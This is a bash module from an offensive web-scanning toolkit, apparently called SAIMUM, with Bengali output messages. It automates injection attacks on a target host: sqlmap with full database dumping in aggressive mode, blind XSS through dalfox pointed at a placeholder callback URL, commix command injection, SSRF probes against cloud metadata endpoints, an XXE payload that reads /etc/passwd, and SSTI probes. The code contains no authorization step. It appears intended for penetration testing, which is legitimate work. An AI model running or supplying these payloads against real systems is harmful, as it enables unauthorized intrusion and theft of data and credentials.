#!/bin/bash
# ================================================================
#   SAIMUM v3.0 — injection.sh — Stage 5: Injection Testing
# ================================================================

_sqlmap_flags() {
    case "$SCAN_MODE" in
        1) echo "--batch --random-agent --level=1 --risk=1 --delay=2" ;;
        2) echo "--batch --random-agent --level=2 --risk=1" ;;
        3) echo "--batch --random-agent --level=5 --risk=3 --forms --dbs --dump-all" ;;
    esac
}

_proxy_flag() {
    [ -n "$PROXY" ] && echo "--proxy=$PROXY" || echo ""
}

run_sqlmap() {
    local target="$1"
    local out="$OUTPUT_DIR/40_sqlmap.txt"
    command -v sqlmap &>/dev/null || { log_skip "sqlmap"; return; }

    local flags; flags=$(_sqlmap_flags)
    local pf; pf=$(_proxy_flag)
    local tested=0

    # Test discovered PHP/param URLs
    if [ ${#PHP_FILES[@]} -gt 0 ]; then
        for url in "${PHP_FILES[@]:0:5}"; do
            log_info "sqlmap: $url"
            run_tool "sqlmap" \
                "sqlmap -u \"$url\" $flags $pf --output-dir=$OUTPUT_DIR/sqlmap_out" \
                "$out" "$TIMEOUT_SQLMAP"
            tested=1
            [ "$SCAN_MODE" -ne 3 ] && break
        done
    fi

    # Historical URLs
    if [ ${#HISTORICAL_URLS[@]} -gt 0 ] && [ "$SCAN_MODE" -ge 2 ]; then
        local out_hist="$OUTPUT_DIR/40b_sqlmap_hist.txt"
        local tmp="/tmp/saimum_sql_urls_$$.txt"
        printf '%s\n' "${HISTORICAL_URLS[@]:0:10}" > "$tmp"
        run_tool "sqlmap Wayback" \
            "sqlmap -m $tmp $flags $pf --output-dir=$OUTPUT_DIR/sqlmap_hist_out" \
            "$out_hist" "$TIMEOUT_SQLMAP"
        rm -f "$tmp"
        tested=1
    fi

    # Fallback: form crawl
    if [ "$tested" -eq 0 ]; then
        run_tool "sqlmap Forms" \
            "sqlmap -u http://$target/ --forms --crawl=2 $flags $pf --output-dir=$OUTPUT_DIR/sqlmap_out" \
            "$out" "$TIMEOUT_SQLMAP"
    fi

    grep -qi "is vulnerable\|SQL injection" "$out" 2>/dev/null && \
        log_critical "SQL Injection পাওয়া গেছে!"

    local found=0
    grep -qi "is vulnerable" "$out" 2>/dev/null && found=1
    write_bangla "$OUTPUT_DIR/40_sqlmap_bangla.txt" \
        "  sqlmap — বাংলা বিশ্লেষণ" \
        "$([ $found -eq 1 ] && echo '🔴 CRITICAL: SQL Injection পাওয়া গেছে!' || echo '✅ SQL Injection পাওয়া যায়নি।')" \
        "💡 SQLi দিয়ে database এর সব data চুরি সম্ভব।" \
        "🔧 Fix: Prepared Statement ও ORM ব্যবহার করুন।"
}

run_dalfox() {
    local target="$1"
    local out="$OUTPUT_DIR/41_dalfox.txt"
    command -v dalfox &>/dev/null || { log_skip "dalfox"; return; }

    local opts="--silence"
    [ "$SCAN_MODE" -eq 3 ] && opts="--deep-domxss"

    # Pipe mode: paramspider output দিয়ে (best coverage)
    if [ -f "$OUTPUT_DIR/28_paramspider.txt" ] && \
       grep -q "=" "$OUTPUT_DIR/28_paramspider.txt" 2>/dev/null; then
        local out_pipe="$OUTPUT_DIR/41b_dalfox_pipe.txt"
        run_tool "Dalfox Pipe" \
            "cat $OUTPUT_DIR/28_paramspider.txt | dalfox pipe $opts" \
            "$out_pipe" "$TIMEOUT_SQLMAP"
        grep -qi "POC\|XSS" "$out_pipe" 2>/dev/null && \
            log_high "Dalfox Pipe — XSS পাওয়া গেছে!"
    fi

    # Single URL mode
    local url="http://$target"
    [ ${#PHP_FILES[@]} -gt 0 ] && url="${PHP_FILES[0]}"
    run_tool "Dalfox URL" "dalfox url $url $opts" "$out" "$TIMEOUT_SQLMAP"

    # Blind XSS (Aggressive)
    if [ "$SCAN_MODE" -eq 3 ] && [ ${#PHP_FILES[@]} -gt 0 ]; then
        local out_blind="$OUTPUT_DIR/41c_dalfox_blind.txt"
        run_tool "Dalfox Blind" \
            "dalfox url ${PHP_FILES[0]} --blind http://your-callback-url.com $opts" \
            "$out_blind" 120
    fi

    grep -qi "POC\|vulnerable\|XSS" "$out" 2>/dev/null && \
        log_high "Dalfox — XSS vulnerability পাওয়া গেছে!"

    write_bangla "$OUTPUT_DIR/41_dalfox_bangla.txt" \
        "  Dalfox — বাংলা বিশ্লেষণ" \
        "$(grep -qi 'POC' "$out" 2>/dev/null && echo '🟠 HIGH: XSS পাওয়া গেছে!' || echo '✅ XSS পাওয়া যায়নি।')" \
        "💡 XSS দিয়ে session চুরি ও browser hijack সম্ভব।" \
        "🔧 Fix: Output HTML encode করুন, CSP header যোগ করুন।"
}

run_xsstrike() {
    local target="$1"
    local out="$OUTPUT_DIR/42_xsstrike.txt"
    command -v xsstrike &>/dev/null || { log_skip "xsstrike"; return; }
    command -v dalfox &>/dev/null && [ "$SCAN_MODE" -ne 3 ] && return

    local url="http://$target"
    [ ${#PHP_FILES[@]} -gt 0 ] && url="${PHP_FILES[0]}"

    run_tool "XSStrike" "xsstrike --url $url --crawl --skip-dom" "$out" "$TIMEOUT_SQLMAP"

    grep -qi "XSS\|vulnerable" "$out" 2>/dev/null && log_high "XSStrike — XSS hint।"
    write_bangla "$OUTPUT_DIR/42_xsstrike_bangla.txt" \
        "  XSStrike — বাংলা বিশ্লেষণ" \
        "$(grep -qi 'vulnerable' "$out" 2>/dev/null && echo '🟠 XSS সম্ভাব্য।' || echo '✅ XSS পাওয়া যায়নি।')"
}

run_commix() {
    local target="$1"
    local out="$OUTPUT_DIR/43_commix.txt"
    command -v commix &>/dev/null || { log_skip "commix"; return; }
    [ "$SCAN_MODE" -ne 3 ] && return

    local url="http://$target"
    [ ${#PHP_FILES[@]} -gt 0 ] && url="${PHP_FILES[0]}"

    run_tool "commix" \
        "commix --url $url --batch --output-dir=$OUTPUT_DIR" \
        "$out" "$TIMEOUT_SQLMAP"

    grep -qi "is vulnerable\|command injection" "$out" 2>/dev/null && \
        log_critical "Command Injection পাওয়া গেছে! RCE possible!"

    write_bangla "$OUTPUT_DIR/43_commix_bangla.txt" \
        "  commix — বাংলা বিশ্লেষণ" \
        "$(grep -qi 'command injection' "$out" 2>/dev/null && echo '🔴 CRITICAL: Command Injection! Server এ OS command চালানো সম্ভব!' || echo '✅ Command Injection পাওয়া যায়নি।')"
}

run_ssrf() {
    local target="$1"
    local out="$OUTPUT_DIR/44_ssrf.txt"

    log_info "SSRF check করা হচ্ছে..."
    {
        echo "=== SSRF TEST ==="
        # Cloud metadata endpoint
        local meta_payloads=(
            "http://169.254.169.254/latest/meta-data/"
            "http://metadata.google.internal/computeMetadata/v1/"
            "http://169.254.169.254/metadata/v1/"
        )
        local ssrf_params=("url" "uri" "path" "src" "dest" "redirect" "proxy" "load" "fetch")

        for param in "${ssrf_params[@]}"; do
            for payload in "${meta_payloads[@]}"; do
                local resp
                resp=$(curl -sf --max-time 8 \
                    "http://$target/?${param}=${payload}" 2>/dev/null)
                if echo "$resp" | grep -qE "ami-id|hostname|instance-type|computeMetadata"; then
                    echo "VULNERABLE: ?${param}=${payload}"
                    log_critical "SSRF পাওয়া গেছে! Cloud metadata accessible!"
                fi
            done
        done
        echo "SSRF test complete."
    } | tee "$out"
    reg_file "ssrf" "$out"
}

run_jwt_test() {
    local target="$1"
    local out="$OUTPUT_DIR/45_jwt.txt"
    command -v jwt_tool &>/dev/null || { log_skip "jwt_tool"; return; }

    # Look for JWT in responses
    local jwt_token
    jwt_token=$(curl -sf --max-time 10 "http://$target/" 2>/dev/null | \
        grep -oE 'eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*' | head -1)

    if [ -n "$jwt_token" ]; then
        log_info "JWT token পাওয়া গেছে — testing করা হচ্ছে..."
        run_tool "jwt_tool" \
            "jwt_tool $jwt_token -M at -v" \
            "$out" 60
        grep -qi "VULNERABLE\|none\|alg.*none" "$out" 2>/dev/null && \
            log_critical "JWT vulnerability পাওয়া গেছে!"
    else
        log_info "JWT token পাওয়া যায়নি।"
    fi
    reg_file "jwt" "$out"
}

run_xxe_check() {
    local target="$1"
    local out="$OUTPUT_DIR/46_xxe.txt"
    [ "$SCAN_MODE" -lt 3 ] && return

    log_info "XXE injection check করা হচ্ছে..."
    local xxe_payload='<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><test>&xxe;</test>'
    {
        echo "=== XXE INJECTION TEST ==="
        local resp
        resp=$(curl -sf --max-time 10 -X POST \
            -H "Content-Type: application/xml" \
            -d "$xxe_payload" \
            "http://$target/" 2>/dev/null)
        echo "$resp" | grep -qE "root:.*:0:0" && \
            { echo "VULNERABLE: XXE injection possible!"; log_critical "XXE Injection পাওয়া গেছে!"; } || \
            echo "Not vulnerable or endpoint not accepting XML."
    } | tee "$out"
    reg_file "xxe" "$out"
}

run_ssti_check() {
    local target="$1"
    local out="$OUTPUT_DIR/47_ssti.txt"
    [ ${#PHP_FILES[@]} -eq 0 ] && return

    log_info "SSTI check করা হচ্ছে..."
    local payloads=("{{7*7}}" "\${7*7}" "#{7*7}" "<%= 7*7 %>" "{{config}}")
    {
        echo "=== SSTI TEST ==="
        for payload in "${payloads[@]}"; do
            local resp
            resp=$(curl -sf --max-time 8 "${PHP_FILES[0]}${payload}" 2>/dev/null)
            echo "$resp" | grep -qE "^49$|>49<" && \
                { echo "VULNERABLE: $payload"; log_critical "SSTI পাওয়া গেছে! RCE possible!"; }
        done
        echo "SSTI test complete."
    } | tee "$out"
    reg_file "ssti" "$out"
}

run_injection_testing() {
    local target="$1"
    show_stage 5 "INJECTION TESTING"

    echo -e "${CYAN}  [*] Injection testing সিদ্ধান্ত:${NC}"
    [ ${#PHP_FILES[@]} -gt 0 ] && log_info "PHP/param URL পাওয়া গেছে → sqlmap, dalfox চলবে।"
    [ "$WEB_AVAILABLE" -eq 1 ] && log_info "Web available → XSS, SSRF, SSTI check হবে।"
    [ "$SCAN_MODE" -eq 3 ]     && log_info "Aggressive → commix, XXE, SSTI চলবে।"
    echo ""

    run_sqlmap   "$target"
    run_dalfox   "$target"
    run_xsstrike "$target"
    run_ssrf     "$target"
    run_jwt_test "$target"

    [ "$SCAN_MODE" -eq 3 ] && run_commix "$target"
    [ "$SCAN_MODE" -eq 3 ] && run_xxe_check "$target"
    run_ssti_check "$target"

    save_state
}
